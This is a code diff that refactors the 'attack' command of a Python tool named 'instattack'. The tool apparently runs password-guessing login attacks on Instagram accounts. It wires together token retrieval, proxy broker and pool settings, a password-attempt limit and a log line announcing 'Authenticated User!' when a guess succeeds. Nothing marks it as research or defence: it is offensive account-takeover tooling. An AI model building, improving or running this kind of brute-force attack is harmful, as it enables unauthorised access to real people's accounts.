@@ -1,36 +1,31 @@
 import asyncio
 
-from instattack.models import User
+from instattack.core.attack import attack, get_token
 
 from .base import Instattack
 from .args import RequestArgs, ProxyArgs, PasswordArgs, TokenArgs
-from .stages import attack, get_token
 
 
 @Instattack.subcommand('attack')
 class InstattackAttack(Instattack, RequestArgs, ProxyArgs, PasswordArgs, TokenArgs):
 
     async def retrieve_token(self, loop):
-
-        request_config = self.request_config(method='GET')
-        request_config['token_max_fetch_time'] = self._token_max_fetch_time
-        proxy_config = self.proxy_config(method='GET')
-
         return await get_token(
             loop,
-            request_config=request_config,
-            proxy_config=proxy_config
+            request_config=self.request_config(method='GET'),
+            broker_config=self.broker_config(method='GET'),
+            pool_config=self.pool_config(method='GET'),
         )
 
     async def attempt_attack(self, loop, token):
-
         return await attack(
             loop,
             token,
             self.user,
+            pwlimit=self._pwlimit,
             request_config=self.request_config(method='POST'),
-            proxy_config=self.proxy_config(method='POST'),
-            pwlimit=self._pwlimit
+            broker_config=self.broker_config(method='POST'),
+            pool_config=self.pool_config(method='POST'),
         )
 
 
@@ -47,8 +42,9 @@ class AttackRun(InstattackAttack):
     def main(self, username):
         loop = asyncio.get_event_loop()
 
-        self.user = User(username)
-        self.user.setup()
+        self.user = loop.run_until_complete(self.get_user(username))
+        if not self.user:
+            return
 
         # Token will be None if an exception occured.
         token = loop.run_until_complete(self.retrieve_token(loop))
@@ -57,6 +53,7 @@ class AttackRun(InstattackAttack):
             return
 
         self.log.complete('Received Token', extra={'other': token})
+        loop.run_until_complete(asyncio.sleep(0.25))
         result = loop.run_until_complete(self.attempt_attack(loop, token))
         if result:
             self.log.info(f'Authenticated User!', extra={
